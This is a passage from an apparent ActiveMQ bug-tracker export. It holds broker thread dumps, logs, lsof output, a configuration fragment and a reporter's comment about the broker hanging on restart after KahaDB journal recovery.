        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:872)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1179)
        at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:201)
        at java.util.concurrent.FutureTask.get(FutureTask.java:80)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.removeAsyncMessage(KahaDBStore.java:337)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.removeAsyncMessage(KahaDBTransactionStore.java:457)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore$1.removeAsyncMessage(KahaDBTransactionStore.java:171)
        at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:797)
        at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1527)
        at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1519)
        at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1584)
        at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1574)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1686)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        - locked <0x90cb36c8> (a org.apache.activemq.broker.region.Queue$3)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Connection"" daemon prio=1 tid=0x89783a98 nid=0x7fd4 in Object.wait() [0x88461000..0x88462080]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90cc5188> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x90cc5188> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Timer-1"" prio=1 tid=0x898f7bf8 nid=0x7f9c in Object.wait() [0x885e4000..0x885e4e80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90cf75c8> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Timer.java:509)
        - locked <0x90cf75c8> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""HashSessionScavenger-0"" daemon prio=1 tid=0x898834c0 nid=0x7f9b in Object.wait() [0x88665000..0x88665f00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90d4a800> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Timer.java:509)
        - locked <0x90d4a800> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""qtp14633980-49"" prio=1 tid=0x895d3050 nid=0x7f9a waiting on condition [0x886e6000..0x886e6f80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-48"" prio=1 tid=0x896688c0 nid=0x7f99 waiting on condition [0x88767000..0x88768000]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-47"" prio=1 tid=0x896f5660 nid=0x7f98 waiting on condition [0x887e8000..0x887e9080]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-46"" prio=1 tid=0x896f4940 nid=0x7f97 waiting on condition [0x88869000..0x8886a100]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-45"" prio=1 tid=0x89552168 nid=0x7f96 waiting on condition [0x888ea000..0x888ead80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-44"" prio=1 tid=0x89af3680 nid=0x7f95 waiting on condition [0x8896b000..0x8896be00]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-43"" prio=1 tid=0x8afe1d38 nid=0x7f94 waiting on condition [0x88a6d000..0x88a6de80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at org.eclipse.jetty.util.BlockingArrayQueue.poll(BlockingArrayQueue.java:320)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:465)
        at java.lang.Thread.run(Thread.java:595)

""qtp14633980-42 - Acceptor0 SelectChannelConnector@0.0.0.0:7922"" prio=1 tid=0x89552d90 nid=0x7f93 runnable [0x889ec000..0x889ecf00]
        at sun.nio.ch.PollArrayWrapper.poll0(Native Method)
        at sun.nio.ch.PollArrayWrapper.poll(PollArrayWrapper.java:100)
        at sun.nio.ch.PollSelectorImpl.doSelect(PollSelectorImpl.java:56)
        at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:69)
        - locked <0x90ca0a98> (a sun.nio.ch.Util$1)
        - locked <0x90ca0a88> (a java.util.Collections$UnmodifiableSet)
        - locked <0x90ca09b0> (a sun.nio.ch.PollSelectorImpl)
        at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:80)
        at org.eclipse.jetty.io.nio.SelectorManager$SelectSet.doSelect(SelectorManager.java:480)
        at org.eclipse.jetty.io.nio.SelectorManager.doSelect(SelectorManager.java:193)
        at org.eclipse.jetty.server.nio.SelectChannelConnector.accept(SelectChannelConnector.java:134)
        at org.eclipse.jetty.server.AbstractConnector$Acceptor.run(AbstractConnector.java:793)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Transport Server: tcp://0.0.0.0:7921?transport.closeAsync=false"" daemon prio=1 tid=0x898b32d0 nid=0x7f87 runnable [0x88c71000..0x88c72100]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x90bac140> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:280)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Transport Server Thread Handler: tcp://0.0.0.0:7921?transport.closeAsync=false"" daemon prio=1 tid=0x8966b640 nid=0x7f86 waiting on condition [0x88cf2000..0x88cf2d80]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:146)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:1879)
        at java.util.concurrent.LinkedBlockingQueue.poll(LinkedBlockingQueue.java:396)
        at org.apache.activemq.transport.tcp.TcpTransportServer$1.run(TcpTransportServer.java:352)
        at java.lang.Thread.run(Thread.java:595)

""ActiveMQ Data File Writer"" daemon prio=1 tid=0x89a21840 nid=0x7f84 in Object.wait() [0x88df4000..0x88df4e80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90ba1318> (a org.apache.kahadb.journal.DataFileAppender$1)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:325)
        - locked <0x90ba1318> (a org.apache.kahadb.journal.DataFileAppender$1)
        at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:216)

""ActiveMQ Journal Checkpoint Worker"" daemon prio=1 tid=0x898bf0b8 nid=0x7f83 waiting on condition [0x88e75000..0x88e75f00]
        at java.lang.Thread.sleep(Native Method)
        at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:286)

""KahaDB Scheduler"" daemon prio=1 tid=0x8c5d25c0 nid=0x7f82 in Object.wait() [0x88ef6000..0x88ef6f80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90ba0430> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Timer.java:509)
        - locked <0x90ba0430> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""RMI LeaseChecker"" daemon prio=1 tid=0x8afe0d38 nid=0x7f7e waiting on condition [0x89079000..0x89079d80]
        at java.lang.Thread.sleep(Native Method)
        at sun.rmi.transport.DGCImpl$LeaseChecker.run(DGCImpl.java:310)
        at java.lang.Thread.run(Thread.java:595)

""RMI RenewClean-[10.4.64.66:39231]"" daemon prio=1 tid=0x0a337590 nid=0x7f7c in Object.wait() [0x8917b000..0x8917be80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90b9e178> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x90b9e178> (a java.lang.ref.ReferenceQueue$Lock)
        at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:501)
        at java.lang.Thread.run(Thread.java:595)

""GC Daemon"" daemon prio=1 tid=0x0a295dc0 nid=0x7f7a in Object.wait() [0x8927d000..0x8927df80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90c48fe8> (a sun.misc.GC$LatencyLock)
        at sun.misc.GC$Daemon.run(GC.java:100)
        - locked <0x90c48fe8> (a sun.misc.GC$LatencyLock)

""RMI Reaper"" prio=1 tid=0x0a295620 nid=0x7f79 in Object.wait() [0x892fe000..0x892ff000]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90ae27e0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x90ae27e0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:136)
        at sun.rmi.transport.ObjectTable$Reaper.run(ObjectTable.java:336)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-0"" daemon prio=1 tid=0x0a295040 nid=0x7f78 runnable [0x894fe000..0x894ff080]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x90bc0380> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-7923"" daemon prio=1 tid=0x898869b8 nid=0x7f76 runnable [0x8b2e2000..0x8b2e2d80]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x90b9e450> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-0"" daemon prio=1 tid=0x8be438c8 nid=0x7f6d runnable [0x8bcb7000..0x8bcb7e80]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x90b27a40> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at sun.management.jmxremote.LocalRMIServerSocketFactory$1.accept(LocalRMIServerSocketFactory.java:31)
        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""Timer-0"" daemon prio=1 tid=0x8be41cc8 nid=0x7f6c in Object.wait() [0x8bd38000..0x8bd38f00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90b27b28> (a java.util.TaskQueue)
        at java.lang.Object.wait(Object.java:474)
        at java.util.TimerThread.mainLoop(Timer.java:483)
        - locked <0x90b27b28> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""Low Memory Detector"" daemon prio=1 tid=0x8c5cffe0 nid=0x7f6b runnable [0x00000000..0x00000000]

""CompilerThread1"" daemon prio=1 tid=0x8c5cec00 nid=0x7f6a waiting on condition [0x00000000..0x8c079228]

""CompilerThread0"" daemon prio=1 tid=0x8c5cdc80 nid=0x7f69 waiting on condition [0x00000000..0x8c0fa2a8]

""AdapterThread"" daemon prio=1 tid=0x8c5cccc0 nid=0x7f68 waiting on condition [0x00000000..0x00000000]

""Signal Dispatcher"" daemon prio=1 tid=0x8c5cbe88 nid=0x7f67 waiting on condition [0x00000000..0x00000000]

""Finalizer"" daemon prio=1 tid=0x8c5c2840 nid=0x7f66 in Object.wait() [0x8c47d000..0x8c47de00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90b2a8e8> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x90b2a8e8> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:136)
        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)

""Reference Handler"" daemon prio=1 tid=0x8c5c22f8 nid=0x7f65 in Object.wait() [0x8c4fe000..0x8c4fee80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90b31778> (a java.lang.ref.Reference$Lock)
        at java.lang.Object.wait(Object.java:474)
        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116)
        - locked <0x90b31778> (a java.lang.ref.Reference$Lock)

""main"" prio=1 tid=0x09b460c0 nid=0x7f58 in Object.wait() [0xbff23000..0xbff24758]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90d6bef0> (a [Z)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.console.command.StartCommand.waitForShutdown(StartCommand.java:161)
        - locked <0x90d6bef0> (a [Z)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:104)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:592)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)

""VM Thread"" prio=1 tid=0x8c5bff38 nid=0x7f64 runnable 

""GC task thread#0 (ParallelGC)"" prio=1 tid=0x09b60ad0 nid=0x7f60 runnable 

""GC task thread#1 (ParallelGC)"" prio=1 tid=0x09b61720 nid=0x7f61 runnable 

""GC task thread#2 (ParallelGC)"" prio=1 tid=0x09b62358 nid=0x7f62 runnable 

""GC task thread#3 (ParallelGC)"" prio=1 tid=0x09b62f90 nid=0x7f63 runnable 

""VM Periodic Task Thread"" prio=1 tid=0x8be4cb40 nid=0x7f6e waiting on condition

----------

 INFO | The connection to '/10.4.64.66:36292' is taking a long time to shutdown.
 INFO | The connection to '/10.4.64.66:36292' is taking a long time to shutdown.
 INFO | The connection to '/10.4.64.66:36292' is taking a long time to shutdown.
 INFO | The connection to '/10.4.64.66:36292' is taking a long time to shutdown.

----------

java    32600 scott    6u  IPv6   19919590      0t0      TCP *:59822 (LISTEN)
java    32600 scott    9u  IPv6   19919615      0t0      TCP *:7923 (LISTEN)
java    32600 scott   12u  IPv6   19919617      0t0      TCP *:39231 (LISTEN)
java    32600 scott   14u  IPv6   20371784      0t0      TCP h1:7922->h2:48935 (ESTABLISHED)
java    32600 scott   18u  IPv6   20371785      0t0      TCP h1:7922->h2:48936 (ESTABLISHED)
java    32600 scott   20u  IPv6   20371786      0t0      TCP h1:7922->h2:48937 (ESTABLISHED)
java    32600 scott   24u  IPv6   20371787      0t0      TCP h1:7922->h2:48938 (ESTABLISHED)
java    32600 scott   29u  IPv6   19919657      0t0      TCP *:7922 (LISTEN)
java    32600 scott   30u  IPv6   20371788      0t0      TCP h1:7922->h2:48939 (ESTABLISHED)
java    32600 scott   31u  IPv6   20371789      0t0      TCP h1:7922->h2:48940 (ESTABLISHED)

----------

        <destinationPolicy>                                                     
          <policyMap>                                                           
            <policyEntries>                                                     
              <!-- By default, do not use the DLQ, and use vmcursors -->        
              <policyEntry queue="">"">                                           
                <deadLetterStrategy>                                            
                  <sharedDeadLetterStrategy processExpired=""false""/>            
                </deadLetterStrategy>                                           
                <pendingQueuePolicy>                                            
                  <vmQueueCursor/>                                              
                </pendingQueuePolicy>                                           
              </policyEntry>                                                    
            </policyEntries>                                                    
          </policyMap>                                                          
        </destinationPolicy> 
[...]
        <systemUsage>                                                           
            <systemUsage sendFailIfNoSpace=""true"">                              
                <memoryUsage>                                                   
                    <memoryUsage limit=""256 mb""/>                               
                </memoryUsage>                                                  
                <storeUsage>                                                    
                    <storeUsage limit=""1 gb"" name=""foo""/>                       
                </storeUsage>                                                   
                <tempUsage>                                                     
                    <tempUsage limit=""100 mb""/>                                 
                </tempUsage>                                                    
            </systemUsage>                                                      
        </systemUsage> 

----------

-rw-r--r-- 1 scott scott 36621377 2011-04-21 17:35 db-126.log
-rw-r--r-- 1 scott scott 37281079 2011-04-21 17:35 db-127.log
-rw-r--r-- 1 scott scott 33556041 2011-04-21 23:17 db-132.log
-rw-r--r-- 1 scott scott 33030144 2011-04-22 09:25 db-134.log
-rw-r--r-- 1 scott scott    53248 2011-04-22 09:25 db.data
-rw-r--r-- 1 scott scott    32824 2011-04-22 09:25 db.redo
-rw-r--r-- 1 scott scott        0 2011-04-21 17:17 lock

du -sh on kahadb: 128M
","Linux 2.6.35-28-generic-pae #49-Ubuntu SMP Tue Mar 1 14:58:06 UTC 2011 i686 GNU/Linux

java version ""1.5.0_22""
Java(TM) 2 Runtime Environment, Standard Edition (build 1.5.0_22-b03)
Java HotSpot(TM) Server VM (build 1.5.0_22-b03, mixed mode)",blackstrype,choufeng.tw,splinakis_p,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3357,"26/Apr/11 21:49;scotte;activemq.xml;https://issues.apache.org/jira/secure/attachment/12477445/activemq.xml","26/Apr/11 21:47;scotte;jms.java;https://issues.apache.org/jira/secure/attachment/12477444/jms.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74704,,,Wed Nov 30 17:01:22 UTC 2011,,,,,,,,,,,"0|i0agvr:",59008,,,,,,,,,,,,,,,,,,,,,"22/Apr/11 16:59;scotte;I mentioned above that in my non-vmQueueCursor testcase ""attempts to restart ActiveMQ hang right after kahadb journal recovery"" when restarted. This happens with this vmQueueCursor as well. Here's the info:

$ bin/activemq
Java Runtime: Sun Microsystems Inc. 1.5.0_22 /opt/java5u22/jre
  Heap sizes: current=4992k  free=3984k  max=504896k
    JVM args: -Xmx512M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dcom.sun.management.jmxremote -Dactivemq.classpath=/home/activemq_cluster/conf; -Dactivemq.home=/home/activemq_cluster -Dactivemq.base=/home/activemq_cluster
ACTIVEMQ_HOME: /home/activemq_cluster
ACTIVEMQ_BASE: /home/activemq_cluster
Loading message broker from: xbean:activemq.xml
 INFO | Refreshing org.apache.activemq.xbean.XBeanBrokerFactory$1@f47bf5: startup date [Fri Apr 22 09:52:12 PDT 2011]; root of context hierarchy
 INFO | PListStore:/home/activemq_cluster/data/cluster_a/tmp_storage started
 INFO | Using Persistence Adapter: KahaDBPersistenceAdapter[/home/activemq_cluster/data/kahadb]
 INFO | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:7923/jmxrmi
 INFO | KahaDB is version 3
 INFO | Recovering from the journal ...
 INFO | Recovery replayed 2 operations from the journal in 0.028 seconds.
 INFO | ActiveMQ 5.4.2 JMS Message Broker (cluster_a) is starting
 INFO | For help or more information please see: http://activemq.apache.org/

--- HANGS HERE ---

kahadb directory has same contents as above, and du -sh shows it still consuming 129M.


---------

Full thread dump Java HotSpot(TM) Server VM (1.5.0_22-b03 mixed mode):

""Topic  ActiveMQ.Advisory.Expired.Queue.orchestrationResponse"" daemon prio=1 tid=0x088978d8 nid=0x2d22 in Object.wait() [0x890f0000..0x890f1080]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x917bf4d0> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x917bf4d0> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.MessageDLQd.Queue.orchestrationResponse"" daemon prio=1 tid=0x08894428 nid=0x2d21 in Object.wait() [0x89171000..0x89172100]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x917bf5d0> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x917bf5d0> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Queue:orchestrationResponse"" daemon prio=1 tid=0x08d2fd30 nid=0x2d1f in Object.wait() [0x894f8000..0x894f8d80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x911c1e58> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x911c1e58> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Broker[cluster_a] Scheduler"" daemon prio=1 tid=0x092ca540 nid=0x2d1d in Object.wait() [0x891f2000..0x891f2e00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x91047800> (a java.util.TaskQueue)
        at java.lang.Object.wait(Object.java:474)
        at java.util.TimerThread.mainLoop(Timer.java:483)
        - locked <0x91047800> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""ActiveMQ Data File Writer"" daemon prio=1 tid=0x092ca8c8 nid=0x2d1c in Object.wait() [0x89273000..0x89273e80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x91047a90> (a org.apache.kahadb.journal.DataFileAppender$1)
        at java.lang.Object.wait(Object.java:474)
        at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:325)
        - locked <0x91047a90> (a org.apache.kahadb.journal.DataFileAppender$1)
        at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:216)

""ActiveMQ Journal Checkpoint Worker"" daemon prio=1 tid=0x089b6500 nid=0x2d1b waiting on condition [0x89f8d000..0x89f8df00]
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:118)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:716)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:746)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1076)
        at java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync.wlock(ReentrantReadWriteLock.java:342)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:637)
        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:690)
        at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:293)

""KahaDB Scheduler"" daemon prio=1 tid=0x092c9410 nid=0x2d1a in Object.wait() [0x8977d000..0x8977df80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x91047d28> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Timer.java:509)
        - locked <0x91047d28> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Timer.java:462)

""RMI LeaseChecker"" daemon prio=1 tid=0x08b66310 nid=0x2d17 waiting on condition [0x893f6000..0x893f7100]
        at java.lang.Thread.sleep(Native Method)
        at sun.rmi.transport.DGCImpl$LeaseChecker.run(DGCImpl.java:310)
        at java.lang.Thread.run(Thread.java:595)

""RMI RenewClean-[10.4.64.66:37218]"" daemon prio=1 tid=0x08cb7720 nid=0x2d15 in Object.wait() [0x89477000..0x89477e00]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x910d8040> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x910d8040> (a java.lang.ref.ReferenceQueue$Lock)
        at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:501)
        at java.lang.Thread.run(Thread.java:595)

""GC Daemon"" daemon prio=1 tid=0x091aa2a0 nid=0x2d12 in Object.wait() [0x895fa000..0x895faf80]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x91124278> (a sun.misc.GC$LatencyLock)
        at sun.misc.GC$Daemon.run(GC.java:100)
        - locked <0x91124278> (a sun.misc.GC$LatencyLock)

""RMI Reaper"" prio=1 tid=0x08c7f9c0 nid=0x2d11 in Object.wait() [0x8967b000..0x8967c000]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x90b3e2b0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:120)
        - locked <0x90b3e2b0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:136)
        at sun.rmi.transport.ObjectTable$Reaper.run(ObjectTable.java:336)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-0"" daemon prio=1 tid=0x092fe4e8 nid=0x2d10 runnable [0x896fc000..0x896fd080]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x9111bf78> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
        at sun.rmi.transport.tcp.TCPTransport.run(TCPTransport.java:340)
        at java.lang.Thread.run(Thread.java:595)

""RMI TCP Accept-7923"" daemon prio=1 tid=0x0907ab00 nid=0x2d0e runnable [0x897fe000..0x897fed80]
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)
        - locked <0x910d39b0> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(ServerSocket.java:450)
        at java.net.ServerSocket.accept(ServerSocket.java:421)
